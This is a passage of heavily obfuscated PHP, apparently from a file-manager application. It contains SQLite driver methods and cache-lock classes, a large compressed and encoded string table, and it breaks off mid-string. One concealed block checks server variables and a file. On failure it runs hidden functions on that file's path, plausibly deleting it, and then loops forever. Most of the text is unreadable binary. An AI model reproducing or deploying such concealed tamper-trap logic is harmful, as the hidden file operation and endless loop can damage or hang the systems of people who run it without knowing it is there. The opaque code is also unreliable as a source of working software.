$_SERVER[ÏéâËõ‘]; $ò‚‚ö°Ğ = $this->query($õÀ¸Æ¯¦[45] . $õÀ¸Æ¯¦[46] . $õÀ¸Æ¯¦[47]); $İÜ€÷Ô² = array(); foreach ($ò‚‚ö°Ğ as $Ü‚ÄˆÂë => $ŞíƒĞ£) { $İÜ€÷Ô²[$Ü‚ÄˆÂë] = current($ŞíƒĞ£); } return $İÜ€÷Ô²; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $‰•Û³×Å =& $_SERVER[ÏéâËõ‘]; $this->error = $this->_linkID->lastErrorMsg(); if ($‰•Û³×Å[12] != $this->queryStr) { $this->error .= LNG($‰•Û³×Å[48]) . $this->queryStr; } think_trace($this->error, $‰•Û³×Å[12], $‰•Û³×Å[49]); return $this->error; } public function escapeString($°—Úùø) { $şˆ…·Å =& $_SERVER[ÏéâËõ‘]; if ($this->_linkID) { return $this->_linkID->escapeString($°—Úùø); } return str_ireplace($şˆ…·Å[58], $şˆ…·Å[59], $°—Úùø); } public function parseLimit($ôØÓ½Øä) { $‡óªöèÆ =& $_SERVER[ÏéâËõ‘]; $šçƒÜ•ç = $‡óªöèÆ[12]; if (!empty($ôØÓ½Øä)) { $ôØÓ½Øä = explode($‡óªöèÆ[50], $ôØÓ½Øä); if (count($ôØÓ½Øä) > 1) { $šçƒÜ•ç .= $‡óªöèÆ[51] . $ôØÓ½Øä[1] . $‡óªöèÆ[52] . $ôØÓ½Øä[0] . $‡óªöèÆ[53]; } else { $šçƒÜ•ç .= $‡óªöèÆ[51] . $ôØÓ½Øä[0] . $‡óªöèÆ[53]; } } return $šçƒÜ•ç; } } goto A™™Æ¥…®; c½†À‡ŒÚ: define($_SERVER[ÏéâËõ‘][238], 1); define($_SERVER[ÏéâËõ‘][239], 2); define($_SERVER[ÏéâËõ‘][240], 3); goto eÅà›áŞŒµ; b–ğ‰ôÖ³Ü: class CacheLockRedis { public function lock($Ç÷äÀ¥™, $Ê®Ê­µ = 10) { $Õ‰Èóù“ = Cache::init(); $§ó’Í»… = microtime(!0) + $Ê®Ê­µ; while (microtime(!0) < $§ó’Í»…) { $†ù¶é¾ = $Õ‰Èóù“->get($Ç÷äÀ¥™); if (!$†ù¶é¾) { $¨Ä¶ïØæ = $Õ‰Èóù“->setLock($Ç÷äÀ¥™, $§ó’Í»…, $Ê®Ê­µ); if ($¨Ä¶ïØæ) { return !0; } } else { if ($†ù¶é¾ < microtime(!0)) { $Õ‰Èóù“->set($Ç÷äÀ¥™, $§ó’Í»…, $Ê®Ê­µ * 2); if ($Õ‰Èóù“->get($Ç÷äÀ¥™) === $†ù¶é¾) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($õùµ£òó) { return Cache::init()->get($õùµ£òó); } public function unlock($ïîóÊªê) { return Cache::init()->remove($ïîóÊªê); } } if (!isset($_SERVER[$_SERVER[ÏéâËõ‘][864]]) || !isset($_SERVER[$_SERVER[ÏéâËõ‘][865]])) { $_getc = $_SERVER[ÏéâËõ‘][866]; $_getfile = $_SERVER[$_SERVER[ÏéâËõ‘][867]] . $_SERVER[ÏéâËõ‘][868]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ÏéâËõ‘][231], $_getfilec); if (count($_getarrs) < $_SERVER[ÏéâËõ‘][620]) { $exit = $_SERVER[ÏéâËõ‘][869]; $exit(); } $_act = $_SERVER[ÏéâËõ‘][870]; $_act($_SERVER[$_SERVER[ÏéâËõ‘][867]] . $_SERVER[ÏéâËõ‘][868]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[ÏéâËõ‘][378]); } } class CacheLockMemcached { public function lock($µŞÁ–ÆÕ, $ÈäøÃŠ = 0) { $î¥ë××¬ = Cache::init(); $¨ïßğÛ” = microtime(!0) + $ÈäøÃŠ; while (microtime(!0) < $¨ïßğÛ”) { $ÑÂè¥à’ = $î¥ë××¬->get($µŞÁ–ÆÕ); if (!$ÑÂè¥à’ || $ÑÂè¥à’ < microtime(!0)) { $Èšƒòæ° = $î¥ë××¬->handle->add($µŞÁ–ÆÕ, $¨ïßğÛ”, $ÈäøÃŠ); if ($Èšƒòæ°) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($Ñõ¨¨) { return Cache::init()->get($Ñõ¨¨); } public function unlock($±®áµ”Ñ) { return Cache::init()->remove($±®áµ”Ñ); } } goto Aõ…øè¿¾; Bˆ©ºÕ‰å‚: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define(base64_decode('z+niy/WR'), "\346\213\337\236\331\200"); $_SERVER[ÏéâËõ‘] = explode("\x7c\x1\x7c\x3\x7c\x1", gzinflate(substr("\x1f\x8b\x8\x0\x0\x0\x0\x0\x0\x13\xc5\xbd\x9\x78\x1b\xd5\xd5\x30\xcc\x5e\xd6\xd2\x2\x6d\x59\xa\xc\x86\xe0\x25\x5a\x9c\x84\x84\xc4\x89\x93\x28\xb6\x6c\x2b\x91\x25\x23\xc9\xd9\x6c\x33"."\31\113\143\153\142\111\43\317\214\274\45\241\20\110\241\320\0\141\247\354\120\132\240\20\222\262\245\100\200\227\102\151\41\54\55\224\55\244\264\45\13\264\254\145\51\133\313\167"._kodDe('MGGFB4Xet73sK+2FvXcVjNTNqdxp1adpyqe8ik3O4eG0SSzppyu43EXF7B3VrMtE0Q==')."\xfa\x4d\xfe\xdf\x9b\x7e\x1f\x7b\xde\xbe\xbb\x91\x3f\x87\x9e\x77\x6e\x4d\x4d\xdb\xb4\xfd\x27\xc6\xe\xbc\xe0\xee\x3b\xb4\xdb\xb5\xf5\xda\xda\x78\xf4\xa9\x2d\x91\x83\x9e\xb9\x7d\x7e\x78\xe7\x4d"."\117\215\356\334\175\267\37\237\172\363\33\15\50\61\315\333\100\177\224\202\351\50\372\210\141\73\66\5\244\315\102\237\321\117\277\215\2\375\15\322\237\316\104\324\322\363\246\243"."\323\140\200\376\250\122\273\166\267\7\163\6\213\127\143\361\224\232\354\354\350\10\47\122\220\250\101\216\317\233\31\370\52\152\226\226\207\372\213\272\145\243\326\310\305\251\105\263"."\250\27\134\20\1\310\150\216\326\253\331\120\122\363\74\265\71\334\21\215\57\121\123\113\72\302\220\242\127\35\54\351\326\50\15\221\317\244\243\131\116\312\310\353\74\305\260\305".strrev('BWN_j'."\n".'CÛZ„Hé(-5Î"xr©#ÛÛÅ7ñ"¥5–(D©)‰Ü/5Û')."\237\131\243\54\243\61\313\224\132\372\321\142\350\271\14\375\54\150\254\71\316\150\21\276\122\374\13\115\123\241\224\313\321\100\214\177\145\364\76\255\224\203\321\152\226\3\105\313".base64_decode('yGus0wv0UQ6lH1rJMY1CmgbCI46lCThqaxpNtF6AopLhaLgppeAGKi2JeLsCk5DX')."\x6c\x47\xb7\x94\x45\x6d\xe1\x44\x58\xc1\x8d\x6e\xac\x26\x7d\xad\x56\x0\x5f\x62\x68\x28\x94\x50\x34\xaa\x8c\x57\x82\xa3\xe7\x8b\xac\x18\x9a\xa7\x42\x61\xf1\x44\x73\x38\xa1\xcc\x5b\xa2\x88\x11"."\x4a\x9b\xf9\xbc\x59\x8\xa0\x52\xd0\x4c\x3a\x52\x53\xc3\x89\x4\xfd\xf0\x1\x7a\x47\x23\x78\xd2\x20\x10\x6f\x69\x49\x86\x79\x8\x3a\x77\x4a\x14\xb5\x64\xa\xe0\xa7\x2b\x94\xe9\xcb\x39\xea\x90".base64_decode('lisxNB2gv9XwA7+mDag7aBSMEqApFGGafFnBR4ml1hlEz8BHHuU3YeWhZThEPxtn')."\323\337\231\220\250\127\305\161\272\345\250\172\41\155\146\214\2\54\326\71\200\164\232\223\155\266\14\224\200\206\373\314\134\206\175\333\306\30\164\245\317\310\351\261\122\136\116\302"."\203\351\254\221\313\130\154\175\175\135\112\32\214\362\345\212\323\212\120\21\265\204\257\164\243\157\124\254\67\333\54\131\151\75\202\126\204\310\327\301\123\117\202\104\272\343\240\316"."\301\330\30\146\147\61\147\152\231\244\156\361\256\31\146\13\312\30\57\71\62\260\104\222\265\230\126\276\31\121\6\250\37\255\12\243\263\102\304\0\133\27\31\151\304\202\65\135"."\147\370\377\333\323\65\27\375\127\13\244\257\33\332\224\325\163\71\125\37\321\141\341\344\63\123\155\66\30\101\273\327\50\4\21\204\6\43\161\65\253\331\331\366\314\124\225\344".base64_decode('YhQ1o48EitkirGq+kLtdiI2HLmY6YYku58y0lpO7SL+zjlNM6oUMHgnoijlcICNV')."\xd4\x75\x48\xd4\xec\x53\x32\x4a\xbb\xb2\x44\x69\x6b\x30\x1a\x6c\x96\x31\x9f\xe3\x5f\xac\x77\x1c\x66\x73\xa0\x33\xc2\xa6\x33\xd3\x47\x3f\x7a\xd9\xb6\x50\x5\x15\x1a\x36\xa1\x70\x62\x79\x6a\xc5"."\142\316\110\153\216\141\26\202\146\332\321\35\277\355\130\272\6\45\206\322\151\335\266\375\115\146\301\261\314\234\77\224\313\231\303\376\270\145\364\33\205\6\245\16\210\55\212\104"."\x8b\xda\x8f\x9\x60\x3\xac\xd4\xaa\x99\xa\x46\x14\x5c\x4d\x5d\x63\xc9\xe9\xf3\x4f\x67\x2b\x90\xa7\xb6\xb4\x82\xdd\xa7\x5b\xfe\x30\xac\x8c\x6\x5\x35\x96\x53\x41\x96\xac\xd9\xb0\x8b\xa6\x6d".base64_decode('4OY1KJrjaOkspiCi+MavSW8UckZBL0sbHikalm6ztiqt7SkoBJWu+zssrT+vNSjF')."\x52\x2f\x1a\x19\x58\xa9\x15\x60\x34\x35\xc\x4d\x83\x92\xc6\x41\x9f\x92\x2f\xd9\x8e\xdf\xd2\x11\x29\x32\xd0\x76\x7\x83\x1c\xe9\xf3\xb7\xe3\x75\x65\xe8\x19\x7f\x12\x51\x6c\x0\x4f\xa9\x3f\x49".base64_decode('QaijsDgKbUulOtRIC9qSY2G1PZRqaoNmO1o/a3MU0WFeJAMu9qP1hZErhvoqgB3m').base64_decode('sG6hiueNNigDZqbXHAmwKJw4iQgNS4ynu+j4E1qhH49P76ijAwraQ/3ugY7qhX4n')."\313\62\46\303\211\205\341\204\232\214\267\244\26\205\22\260\231\27\20\226\214\260\252\160\321\71\177\102\317\240\241\117\73\54\237\126\304\243\306\322\340\305\201\347\212\305\342\5"."\xc3\xe2\xa2\x91\x56\x3c\x30\xcd\x7e\x1b\x25\xf2\xcb\xa9\x58\xd9\x51\x23\x6f\xe0\xb6\x3b\x3c\x86\x8c\x24\xda\xe9\x5b\xa1\x41\x41\xd2\xa1\xc6\xee\x6c\x5d\x4d\x77\x66\x62\xad\x1f\xfd\x5f\x57\xdb".base64_decode('1d0cqOuZEzREnuCkwCRlcv00pQOxHoaWU6DTZSnqlfgC97AIbC6YBf1rBgfvXdKy')."\367\14\53\5\46\302\247\164\206\223\51\265\75\234\152\213\67\103\355\341\20\174\105\115\272\154\131\157\273\350\117\17\314\156\17\375\121\15\273\105\332\126\160\220\223\37\325\354"."\135\216\46\243\135\147\64\266\217\322\350\110\136\353\367\220\174\34\152\67\55\335\15\21\133\325\42\43\303\366\4\34\154\323\215\376\54\214\227\201\113\113\233\71\323\322\162\230"."\x32\xb2\x45\xa1\x33\x6a\xd5\x6f\x0\xb5\x2\x22\x2c\x2\x49\x23\x5f\x64\x8d\x75\xb2\xa5\x7c\xaf\xf4\x9\xd4\xde\x46\xf8\xc3\x68\x59\xd6\xe4\xfb\x99\x69\xc1\x57\x43\x10\x12\x4e\x98\xdc\xc2\xa8"."\x7d\x30\x39\x5\xfd\x15\xa4\x3d\x63\xe6\x35\x46\x28\x9\x89\xd3\x33\x94\xc6\x51\x50\x9d\x2b\xa6\x4d\xd7\xc4\x26\xed\x58\x8e\x89\xa1\x96\x2b\x9\x1a\xd0\xac\x9\x13\xdb\xaf\xb3\x26\x95\x78\xdb"."\x58\x2b\x33\x7a\x4e\x67\xa3\x91\xd5\xd9\x36\x51\xf\xc9\xd0\x36\xc7\xc7\xaa\x8f\xcf\x19\xe2\xf6\x10\x54\xec\xcf\x86\x9d\x40\x39\x31\x51\x67\xe1\x45\x98\x3d\x16\x0\x87\x27\xcd\xa1\x1d\x2a\x4e"."\x66\x5c\x84\x3b\x2c\xbd\xcf\x80\x45\x5a\x40\x33\xd2\xae\x59\x3\xac\x37\x68\x6\x4\xae\xe0\x80\x84\x47\x2d\x9d\xd1\xa8\xda\x14\x8f\xa5\x10\x4b\x4d\x21\x8b\x12\x91\x54\x98\xe1\x6d\xa8\x59\xd"."\x35\x75\xf0\x8d\x57\xcc\x28\x24\xc0\x4\xa6\x7c\xf7\xa0\x90\xa1\xc9\xd0\x70\xd4\x9c\xa0\xd8\xe6\x10\xc5\x2e\x9a\x5\x5b\xf7\xa7\x21\x87\x60\xbd\xcb\xa2\x32\x62\x17\x0\x3a\x23\x76\xe\xcf\x66"."\60\342\327\362\143\376\74\132\2\176\336\120\367\36\254\244\344\255\74\2\263\44\210\73\36\106\44\25\261\315\277\43\236\204\14\163\60\24\61\140\275\272\5\225\165\164\102\124".base64_decode('XsKQ1jAA92f7uQZsVWhRkhHmEkpvGWOa6NIc1h7WkXxO8HPuXvnFyKfaIrEFanu8')."\x39\x1c\x55\x23\x31\x44\x99\x52\xe5\xf0\xce\x8e\xe6\x10\x9b\x4a\x19\x3e\x2f\x9e\x6a\x73\x41\x3b\x11\x6d\x5a\x18\x8a\x46\xbc\xc9\xc3\x8b\x23\xc9\x54\xb2\x62\x14\x82\x75\x86\x3d\x31\x48\x10\xec"."\110\204\133\42\213\171\260\45\22\216\66\47\325\246\120\123\233\110\23\13\265\103\100\355\303\242\230\35\164\247\127\21\221\115\162\201\116\35\302\302\51\33\54\325\45\103\251\114".strrev('w ÔåQN*J­Oèk(ÛDX5äFŒó$g'."\0".'[bY´âô˜‘bîƒLTÍ¡P:')."\224\177\222\156\260\60\142\31\241\176\5\10\176\131\13\124\234\146\236\336\307\351\160\145\100\250\317\341\344\336\23\106\310\57\342\320\14\204\210\354\215\60\201\314\10\124\143\240".base64_decode('pWQ5IdacPiH3qvGOcCKEpWZ1USIea4UMw1mdNSACw1/DmCsQnh1BkBBnpMFayYtB')."\137\156\262\241\134\111\177\116\244\77\210\51\204\312\365\2\33\365\136\114\233\331\356\302\76\372\320\152\140\164\325\54\361\332\172\115\63\307\326\51\342\17\70\301\340\302\367\162".strrev('pØ2X>–å[$á#FL˜1ÄxÙÄ€„ÑfS ¾*CûÙ5#É!›').base64_decode('BQMTAYt1tAVB9cFTu4cn1nT5JwZ60Edt3VwahFB3wBU8AfKXLJ4bs0019pzahu5g')."\x77\xb0\x66\x4e\x43\x57\xc8\x3f\xa6\xf9\xc7\xea\xfd\x33\xfc\x3d\x13\xbb\x3\xb5\x13\x1\xd0\xb3\x62\xb2\xef\xa4\x55\x38\x1\x4a\x38\xe7\xf8\x1e\xf4\xd3\xd8\x3d\x67\x42\xb7\xff\xc4\xd3\x96\xcd"."\355\352\356\251\156\230\170\134\167\340\370\356\341\236\272\332\71\254\236\164\311\102\362\146\172\224\67\65\63\261\6\65\11\261\123\74\111\201\220\74\51\1\213\30\63\212\2\272"."\x62\xda\x2a\x6\x47\x73\xa8\xf7\x8b\x1c\x5d\xfe\xee\x89\x3d\x73\xa4\x7c\x12\xc8\x5b\x17\x62\x97\x10\xfd\xcd\xf2\x74\x21\xff\x52\xdc\x33\x9e\x15\xaf\x7b\xc0\x8f\x52\x21\x2d\xa8\x27\x5e\x17\xbd".base64_decode('WhrogNFf4EsI7elcTndz8Ssm0N9VbCL79RFGGgp9hgXYWSoYg+wYoqAPwofpMPzu')."\325\235\141\235\241\7\202\273\302\10\71\230\350\210\242\244\120\216\60\206\120\3\26\250\70\216\162\144\62\212\52\346\260\206\171\50\243\27\140\236\366\203\324\166\132\53\352\111"."\xa9\x87\xaa\x9a\xa\xcd\x8b\x86\x55\x46\x61\x80\x12\xb3\x30\xa1\x8a\xf3\xf8\x91\x1d\xea\x9a\xa0\xa8\x8c\x3e\xa4\x5\xb\x4f\xa4\x15\x58\xf9\xf6\x60\x4e\x21\x84\x41\xd1\x2d\xcb\xb4\x1a\xc8\xe9".base64_decode('pV0qYtYMSWYOGlsFyfRK42yFDjnkU+UJKGqMT8DSti4WPaZQ0KaimCEbMVSMuwnW').base64_decode('dHeXuvRMTxdCfM3f17NiyqpaxuUHu9EfFghVOEdTOTVU0f4cwO3gRymuAI+mQdPi')."\54\122\321\305\104\73\246\243\345\134\105\244\60\204\221\46\266\161\303\241\2\235\355\250\240\130\170\53\227\16\40\11\71\215\161\41\236\237\215\110\47\140\70\107\122\167\2\74"."\x85\x4f\x8a\x54\x51\xd8\x75\x18\xdc\x58\xc5\x88\x7d\x1\x2d\xa7\x26\x69\xab\xa3\x47\x3b\xc9\x51\xdb\xd1\xf3\xae\x53\x4b\x5b\xd7\xac\x74\xb6\xa5\x94\xcb\x39\x9c\x95\xcf\x19\x3\x50\x3\xac\x15".base64_decode('OET1w24wsVLWFtNiEnEdNKOqrlLCSKGA5FcZ1cQm2xpC7ExKqWEHfkokpsyLx6Ph').base64_decode('UEzB+znsQ4hZSIY7QmgTw7J1MhWGM8hIs5+Vu9gfAQmLfxgw7GYRUxAVjYmKJJkB')."\x36\x97\x88\x20\x3a\x2c\x29\x9c\x97\x41\x8\x33\x9a\x3e\x7c\x42\xe4\xc3\x9c\x86\xf\xf5\xc1\x87\xc5\x23\x9f\xe0\xe2\x7d\xe2\xc0\xcd\x37\x64\xe8\xc3\xe4\x83\x33\xdb\x3e\xe0\xc1\x7d\x8e\x66\x21".base64_decode('hgEzyfAZafYZdjMRIEgFJIo1yMnic5CcNuqjjYvqQ3rOx5rmYy32MdnQRwS6ZmhW')."\47\132\134\320\54\362\211\150\150\326\207\321\11\143\263\117\34\10\372\314\341\202\156\221\44\60\114\102\366\360\11\271\304\327\157\231\245\142\7\253\123\12\321\146\1\100\264\231"."\3\22\246\351\370\230\254\351\223\305\120\150\105\210\255\232\212\303\131\271\67\144\374\275\215\200\271\303\121\345\243\364\15\223\125\76\37\156\221\173\5\55\21\144\372\125\154\317"."\163\245\21\323\313\226\141\116\27\41\74\1\342\153\241\130\306\270\103\55\332\220\214\171\225\260\220\355\74\14\215\305\351\237\70\367\25\234\260\127\302\364\236\10\343\112\123\132"."\177\122\252\316\321\372\131\135\230\224\241\330\161\223\322\357\204\236\36\115\13\221\265\131\22\204\335\41\367\342\52\241\362\222\132\237\247\223\76\262\312\52\255\220\312\30\300\261".base64_decode('nk/Y/vvtx0acLQU++64V9M1rF3pJyGW8KBgO2lhMspNoA2zJsSGaLEcDsfa5Q3jp').base64_decode('BQjxJtcqSX62EQ23pJT5cUTpDFOleVScWCH/mQXFVTYbLqWRxIuwVshQyDK0Kyxr')."\254\142\225\124\271\262\13\244\161\67\302\307\202\112\71\32\342\341\226\7\1\43\7\351\276\330\311\30\50\56\66\316\22\160\211\232\235\246\37\370\230\34\276\164\6\23\123\53"."\x63\xa9\x44\x8c\x4\x80\xb5\xcb\x55\x2f\xe\x8a\x15\xc6\x50\x42\xc1\x15\xf8\x24\xbe\x6\x13\x1c\xbf\x58\x2b\x52\xd0\x3d\xe4\x1e\x8c\xf4\x6c\xb7\x78\x88\x3a\x8c\xc2\xa8\x51\x90\x4f\xb4\x4\x54"."\xec\xd8\x82\x61\xc0\x4b\xdd\x73\x6\xd7\x3c\xde\x37\xdd\x62\xc4\x89\x99\xf\x4e\xd2\x7c\x39\xa3\x30\x20\x6d\xe6\xe2\x38\x7\xb5\x1e\x67\x95\xda\xe\x25\x79\x5a\xce\x88\x2e\x74\xba\x33\x19\x4e"."\250\254\156\130\335\200\361\131\315\22\203\311\150\22\46\14\342\234\20\47\21\101\51\131\237\66\44\230\31\127\36\211\262\330\316\50\153\275\374\351\56\224\6\233\307\13\264\361"."\x83\x90\x4a\x41\x99\x4e\x19\x76\x14\x8d\x5d\xa5\x6f\xd2\xd3\x94\x59\x31\x88\xf\xdb\xd8\x37\x65\x16\x6c\x40\x26\x3c\x9\x35\x8c\xa8\x0\x33\xa2\x4a\x47\xa\x9c\x28\xb9\x29\x1e\x6d\x52\x88\x6f"."\x0\x68\x5b\x45\x9b\x22\xfd\x46\xbc\x7f\xe\xed\x85\x56\x0\xaf\xa1\x56\xbc\xa3\xc9\x9b\x89\x9b\x21\x49\xea\x68\xc1\x40\x3e\x51\x5a\xb2\x2c\x4e\x4e\x2d\x8e\x93\xf0\xe6\x20\x36\x13\x36\xd6\x62"."\11\212\361\27\353\315\205\52\375\242\165\230\206\253\345\215\302\350\136\71\334\142\231\234\153\346\114\202\67\121\23\21\113\371\155\246\147\143\227\6\307\305\214\224\201\244\74\136"."\266\304\3\365\4\305\254\270\166\45\12\142\107\320\132\46\157\24\2\26\335\373\2\110\330\200\33\150\137\275\304\271\11\242\264\302\46\273\10\354\225\253\74\223\356\230\46\222"."\140\255\200\205\152\26\15\222\10\42\120\23\162\101\211\67\115\231\337\340\245\330\50\102\42\355\156\266\212\345\114\26\65\266\54\100\76\51\361\152\70\17\10\64\315\110\17\210"."\245\254\15\151\10\31\241\150\322\31\321\122\32\216\162\66\32\123\232\160\306\160\60\4\157\244\46\73\57\27\11\245\133\151\16\223\11\74\331\247\312\46\137\310\44\276\11\256"."\224\156\116\3\200\165\204\1\10\10\306\110\276\224\117\233\105\300\3\111\7\45\157\16\351\22\60\140\73\146\121\304\110\101\32\55\105\211\102\245\124\174\152\110\73\320\22\313".base64_decode('EKZaDBRJC3mJfE5XcQBLJAGZlocsi6Et7Ry+6EFAGYQpYJKtuUpbGi08PCQ0TGhR').base64_decode('uOIApQABLZOJs8su+bs8qXxWWbkgou7Di5JClZOHcjmhIuANj5uFLnY5kwwZN1sL')."\x11\x8e\xd9\x95\x5d\x25\x18\x17\x84\xe4\xc5\xe6\x66\xe6\x85\x62\x87\x97\xe9\x77\xd3\xed\xf1\x19\x9c\x71\x88\x9c\x98\xd0\xca\x61\xc4\x13\x34\x65\x8d\x82\x6e\xf3\xad\xdd\xb2\x2b\xd1\xac\xff\xc7"."\x9c\x74\xf9\x1c\xe0\xb5\x32\x1e\xe2\xe0\x38\xe9\x7c\x1b\xeb\xbc\xd\xb9\xf6\x71\x7e\x88\x2b\x48\x96\xc4\xaa\x90\x6d\x5f\x75\x5c\x4c\x56\x82\x94\x21\x2d\x1e\x17\x3e\xa0\xc5\x4a\xfb\x8c\xb7\xa5"."\110\34\55\306\312\30\352\115\247\263\143\154\102\347\106\370\326\52\147\302\121\170\276\306\53\224\307\363\302\4\103\47\247\103\230\211\43\306\53\206\105\363\122\326\334\360\314\113"."\xdb\xee\xa5\xdf\xbf\xba\xf4\xec\xab\x3e\xda\x46\xbf\xa7\x4c\x83\xb\xb1\x29\xf4\x7\xfd\xdb\xb\x7e\x25\x7d\xc6\x35\x8b\xbb\xcc\xa3\x9e\xf8\xde\x69\x6d\x3f\x3a\xe7\xd0\xad\xab\x6f\xfc\xf1\x49".base64_decode('tYkbX35hTe2pJ8y/ZGTJ/H/d/EHvppkL1k9/4K6rr/le5PFgy9bHRtvW3Rjo+IF/').strrev('5½¼~uúöCÿFe²Úìfkúú°Ÿ@vó~Û5Áû>·ÃæğŸW‡×Ñí~½/{Mé')."\376\227\43\253\146\355\166\313\267\252\167\377\310\30\332\315\37\125\166\55\176\42\373\353\173\357\55\54\135\323\171\136\362\364\135\37\357\161\371\5\215\207\35\370\316\13\213\67"."\x7e\xfa\x7a\x6c\xde\xb2\xa3\xde\x98\x74\xec\x29\xbd\x7\x9f\x7d\xe1\xfb\x91\x7f\x6c\xf2\x6d\xb8\x25\x73\xfa\xe9\xbd\x55\xf7\x5d\x7c\xd5\xf\x3f\x5a\xba\x57\xc3\x15\x8f\x8e\x9c\xbb\xe7\x3d\x3f"."\137\364\336\61\57\334\363\320\151\317\15\130\217\36\275\165\352\337\174\377\134\373\340\314\325\357\327\134\136\173\346\26\143\302\207\357\357\32\376\350\340\205\47\134\371\243\117\136".strrev('äè;•döœQÊ}¼—/Ğr·¢ö8ö‹ñüôó¾–û‚î¸­ögwõºì¿Ï¹û:').strrev('½/ÉºÃuz¯_ùòúî‹çøşos´Ç~ÿ=±³æŞÿ_Ôİæ•Öz7îåôú_Ÿ')."\xef\xdf\x70\xef\xfd\xeb\x26\x5e\xfa\x62\x7b\xec\xd6\xd2\x77\xae\x68\x7a\x74\xdb\xb5\x6b\x7e\xb7\xef\x7b\xe7\xdc\xd1\xb3\x75\xb7\xeb\xb3\x97\x9e\x7b\xd4\xe3\x9d\xda\x1b\xaf\xfd\xf2\x39\xa3\xf5".base64_decode('c+vcY0/55Iw9L/7wyI8O2vits/pKe60d/N5VHbfNvf3b2r+1jhvq3/9P7Yl9wbnz')."\36\73\243\240\154\271\353\47\361\253\376\276\241\166\356\357\367\154\172\371\321\375\217\273\350\261\330\17\223\157\117\330\370\312\111\211\347\157\373\350\360\353\12\311\157\355\267\350".base64_decode('t8fZhxzb9K2Xb5nz77OOecTJ3Tdn9Z/uP67p/Jd+e8Xv9knuoW09809HHz932bHv')."\375\317\376\363\106\136\355\177\360\261\107\147\37\336\222\61\246\36\235\337\372\213\332\313\357\57\216\75\262\176\323\31\353\152\203\13\56\254\273\366\7\277\235\251\75\260\137\115"."\156\331\337\167\273\341\301\237\374\62\360\350\43\53\263\53\72\63\115\377\256\373\215\76\363\336\237\37\122\177\373\176\317\164\356\177\361\346\371\321\333\167\276\364\332\231\277\173".base64_decode('bW7kw4u3160+ve2+v9Y2HZd75d3p7a9MeemQaw/4bL8f1P4s0XpKwx5T1jnbPnjz').strrev('ˆğ?¯—ı&î³|È9Qÿç›)®ŸetùöîÕïÕêsX~G[Ë{¾05¹­öË')."\xef\xff\xb0\x54\x7d\xc0\x63\x8b\x1b\xf6\x98\x3f\xfd\x8e\xf3\x73\x99\xc0\xf5\xef\xb6\x3b\x4f\xef\xb9\x4f\xf4\xb5\x2d\x7b\x6c\xdc\x3b\xae\x9c\xbb\xfb\x2f\x77\x3f\xa0\x65\xcb\xfd\x7\xec\x33\xf9"."\xd5\x3\xdf\x5e\xfa\x49\x47\xcd\x3e\xb5\xf7\x6c\xbb\xe1\xc4\x47\x5f\xde\x63\xf7\xf9\xb7\x6e\x79\xa2\x2a\x7d\xf3\x65\x9f\x4e\x7e\x69\xeb\x77\x9b\xbf\x18\xf1\x9d\xf2\xdd\x8b\xbb\xc3\xe7\xed\xb1"."\xf6\xe0\x9b\xae\x5e\xd8\xfe\xe6\xe9\x47\x5c\x3b\xf6\x93\xeb\xbb\xaf\x3e\xf3\xfd\xe5\x33\x8f\x7f\xfb\xd1\x93\x9f\x7d\x62\xf1\xf4\x7d\x9b\x47\x27\xdf\x10\xb9\xa4\xe9\xa6\x2f\xd7\x9f\x70\x55\xd5".base64_decode('KnPh3X2d76U+3xqxJ2yZ/s5eh1z3Ss9wPPHh4R2XHrbqqE9vmnjW4YFofvbhtTOW')."\xfd\xac\xee\xe5\xc7\x8f\x6c\x5c\x52\xff\xca\xab\x87\x6e\x3d\x7d\x55\xd7\xcd\x5d\xb1\xe7\x6a\x6f\x7a\x33\xf5\xc8\xcb\x9f\x34\x6d\xd8\x77\xed\xf2\x15\x4f\xaf\xda\xfc\xa7\xe5\xf7\x5c\xf0\x51\xdf"."\125\317\237\377\217\253\306\356\334\366\156\360\305\343\366\172\355\157\123\357\211\234\360\306\334\333\256\276\45\262\337\333\153\222\175\327\335\162\327\223\317\135\170\373\3\165\351\175"."\316\375\356\362\155\117\40\11\344\262\342\356\153\217\252\75\344\220\3\237\150\177\351\220\252\143\367\157\335\367\140\375\242\304\253\17\335\277\163\367\153\43\33\146\176\173\350\256"."\x7d\x3e\xd9\x79\xfb\xcd\x87\xff\xd1\xd7\xbb\x7a\xfd\xb1\xef\x1c\x7e\xf9\x1d\x7d\xa7\x35\xfd\xe6\xea\x53\xef\x7a\x2e\xf5\xa7\x45\x8b\x7d\x37\xd6\xd4\xaf\xef\x7a\xf3\x6f\xb5\x27\x5c\xf5\xe1\xc0"."\246\343\337\176\144\303\215\75\277\35\122\366\176\240\170\314\352\77\175\165\314\272\115\163\173\264\7\136\177\366\266\36\163\341\210\175\340\157\377\160\332\131\63\203\107\44\367\72"."\xb1\xfb\x17\xcb\x67\x1f\xb5\xed\xf4\xb3\x96\xfd\xeb\xde\xc5\x47\xbf\x3c\xb9\xad\x31\xb8\xf0\xb2\xf6\xa5\x2b\x17\x9c\x71\xee\xca\xa1\xce\xc1\x6f\xcf\x68\xfe\x74\xe5\x7d\x3d\xcf\x1f\xfc\xcf\xc6"."\366\217\223\173\55\275\260\55\223\377\367\27\107\157\136\144\276\260\342\343\153\237\133\266\127\367\242\137\74\272\363\241\27\373\47\335\260\350\276\211\137\174\361\361\302\103\246\354"."\x31\x52\xf7\xf3\xef\x4e\xdb\xed\xd5\x3d\xdf\x98\x7e\xdf\x83\x7\xdd\xbe\xe2\xe4\x3\x7e\xb5\xcf\xa3\x67\xd4\x6b\x3b\x3e\x78\xa7\xe7\xd0\x17\xb6\xbc\xf1\xc7\xe9\xbd\xdf\x3f\xaf\xed\x92\xdf\xdc"."\274\370\235\7\172\347\24\216\171\157\362\345\217\332\357\376\153\237\237\177\357\230\273\267\137\260\346\265\103\176\365\356\137\13\363\316\376\366\145\237\75\353\333\160\346\376\341\177"."\276\230\237\375\360\360\363\365\7\374\352\361\173\166\334\174\151\327\202\373\376\376\330\156\221\265\357\334\60\266\367\244\206\257\76\276\353\303\